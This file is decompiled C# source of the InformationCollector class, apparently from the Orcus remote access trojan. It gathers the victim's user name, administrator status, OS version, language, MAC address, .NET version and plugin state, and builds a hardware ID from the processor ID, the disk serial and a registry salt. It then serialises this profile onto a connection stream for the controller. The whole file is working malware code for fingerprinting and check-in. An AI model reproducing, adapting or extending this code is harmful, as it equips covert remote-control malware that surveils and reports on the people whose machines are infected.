using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Orcus.Config;
using Orcus.Plugins;
using Orcus.Service;
using Orcus.Shared.Client;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.NetSerializer;
using Orcus.StaticCommandManagement;
using Orcus.Utilities;

namespace Orcus.Connection;

internal static class InformationCollector
{
	private static BasicComputerInformation _basicComputerInformation;

	public static void SendInformation(Stream stream)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0368: Unknown result type (might be due to invalid IL or missing references)
		if (_basicComputerInformation == null)
		{
			BasicComputerInformation val = new BasicComputerInformation();
			val.set_UserName(Environment.UserName);
			val.set_IsAdministrator(User.IsAdministrator);
			val.set_ClientConfig(Settings.ClientConfig);
			val.set_ClientVersion(19);
			val.set_ApiVersion(2);
			val.set_ClientPath(Consts.ApplicationPath);
			val.set_FrameworkVersion(GetFrameworkVersion());
			_basicComputerInformation = val;
			CultureInfo installedUICulture = CultureInfo.InstalledUICulture;
			_basicComputerInformation.set_Language(installedUICulture.TwoLetterISOLanguageName);
			if (installedUICulture.LCID != 4096)
			{
				try
				{
					BasicComputerInformation basicComputerInformation = _basicComputerInformation;
					basicComputerInformation.set_Language(basicComputerInformation.get_Language() + $"-{new RegionInfo(installedUICulture.LCID).TwoLetterISORegionName}");
				}
				catch (Exception)
				{
				}
			}
			switch (Environment.OSVersion.Platform)
			{
			case PlatformID.Win32S:
				_basicComputerInformation.set_OperatingSystemName("Windows 3.1");
				break;
			case PlatformID.Win32Windows:
				_basicComputerInformation.set_OperatingSystemName("Win32 Windows");
				break;
			case PlatformID.Win32NT:
				_basicComputerInformation.set_OperatingSystemName(GetOsFriendlyName());
				if (_basicComputerInformation.get_OperatingSystemName().Contains("Windows 7"))
				{
					_basicComputerInformation.set_OperatingSystemType((OSType)3);
				}
				else if (_basicComputerInformation.get_OperatingSystemName().Contains("Windows 8"))
				{
					_basicComputerInformation.set_OperatingSystemType((OSType)4);
				}
				else if (_basicComputerInformation.get_OperatingSystemName().Contains("Windows 10"))
				{
					_basicComputerInformation.set_OperatingSystemType((OSType)5);
				}
				else if (_basicComputerInformation.get_OperatingSystemName().Contains("Vista"))
				{
					_basicComputerInformation.set_OperatingSystemType((OSType)2);
				}
				else if (_basicComputerInformation.get_OperatingSystemName().Contains("XP"))
				{
					_basicComputerInformation.set_OperatingSystemType((OSType)1);
				}
				break;
			case PlatformID.WinCE:
				_basicComputerInformation.set_OperatingSystemName("Windows CE");
				break;
			default:
				_basicComputerInformation.set_OperatingSystemName("Unknown: " + Environment.OSVersion.Platform);
				break;
			case PlatformID.Xbox:
				_basicComputerInformation.set_OperatingSystemName("XBox");
				break;
			}
			if (string.IsNullOrEmpty(_basicComputerInformation.get_OperatingSystemName()))
			{
				_basicComputerInformation.set_OperatingSystemName(Environment.OSVersion.VersionString);
			}
			try
			{
				_basicComputerInformation.set_MacAddress(GetMacAddress());
			}
			catch (Exception)
			{
			}
		}
		_basicComputerInformation.set_IsServiceRunning(ServiceConnection.Current.IsConnected);
		_basicComputerInformation.set_Plugins(((IEnumerable<KeyValuePair<PluginResourceInfo, bool>>)PluginLoader.Current.AvailablePlugins).Select((Func<KeyValuePair<PluginResourceInfo, bool>, PluginInfo>)delegate(KeyValuePair<PluginResourceInfo, bool> x)
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Expected O, but got Unknown
			PluginInfo val3 = new PluginInfo();
			val3.set_Guid(x.Key.get_Guid());
			val3.set_Name(x.Key.get_PluginName());
			val3.set_Version(x.Key.get_PluginVersion());
			val3.set_IsLoaded(x.Value);
			return val3;
		}).ToList());
		_basicComputerInformation.set_LoadablePlugins(Directory.Exists(Consts.PluginsDirectory) ? (from x in new DirectoryInfo(Consts.PluginsDirectory).GetFiles()
			select Regex.Match(x.Name, "^(?<guid>([0-9A-Fa-f]{32}))_(?<version>(\\d+(?:\\.\\d+)+))$") into x
			where x.Success
			select x).Select((Func<Match, LoadablePlugin>)delegate(Match x)
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_0041: Expected O, but got Unknown
			LoadablePlugin val2 = new LoadablePlugin();
			val2.set_Guid(new Guid(x.Groups["guid"].Value));
			val2.set_Version(x.Groups["version"].Value);
			return val2;
		}).ToList() : null);
		_basicComputerInformation.set_ActiveCommands(StaticCommandSelector.Current.GetActiveCommandIds());
		List<Type> list = new List<Type>(BuilderPropertyHelper.GetAllBuilderPropertyTypes());
		list.Add(typeof(BasicComputerInformation));
		new Serializer((IEnumerable<Type>)list).Serialize(stream, (object)_basicComputerInformation);
	}

	private static string GetOsFriendlyName()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
			try
			{
				ManagementObject? obj = ((IEnumerable)val.Get()).OfType<ManagementObject>().FirstOrDefault();
				return (obj != null) ? ((ManagementBaseObject)obj).get_Item("Caption").ToString() : null;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
			return "";
		}
	}

	private static double GetFrameworkVersion()
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP");
			if (registryKey == null)
			{
				return 0.0;
			}
			double num = double.Parse(registryKey.GetSubKeyNames()[^1].Remove(0, 1), CultureInfo.InvariantCulture);
			if (num == 4.0)
			{
				using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
				{
					if (registryKey2 == null)
					{
						return num;
					}
					int num2 = (int)registryKey2.GetValue("Release");
					if (num2 >= 393273)
					{
						return 4.6;
					}
					if (num2 >= 379893)
					{
						return 4.52;
					}
					if (num2 >= 378675)
					{
						return 4.51;
					}
					return 4.5;
				}
			}
			return num;
		}
		catch (Exception)
		{
			return 0.0;
		}
	}

	public static string GetHardwareId()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		StringBuilder stringBuilder = new StringBuilder();
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * FROM WIN32_Processor");
			try
			{
				ManagementObject val2 = ((IEnumerable)val.Get()).OfType<ManagementObject>().FirstOrDefault();
				if (val2 != null)
				{
					stringBuilder.Append(((ManagementBaseObject)val2).get_Item("ProcessorId"));
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string text = DriveInfo.GetDrives().First().Name.Replace("\\", null);
			ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text + "\"");
			try
			{
				val3.Get();
				stringBuilder.Append(((ManagementBaseObject)val3).get_Item("VolumeSerialNumber"));
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Orcus", RegistryKeyPermissionCheck.ReadSubTree);
			string text2 = (string)registryKey?.GetValue("HardwareIdSalt", null, RegistryValueOptions.None);
			if (text2 != null)
			{
				stringBuilder.Append(text2);
			}
		}
		catch (Exception)
		{
		}
		using MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		return BitConverter.ToString(mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(stringBuilder.ToString()))).Replace("-", null);
	}

	private static byte[] GetMacAddress()
	{
		byte[] result = null;
		long num = -1L;
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			byte[] addressBytes = networkInterface.GetPhysicalAddress().GetAddressBytes();
			if (networkInterface.Speed > num && addressBytes.Length == 6)
			{
				num = networkInterface.Speed;
				result = addressBytes;
			}
		}
		return result;
	}
}
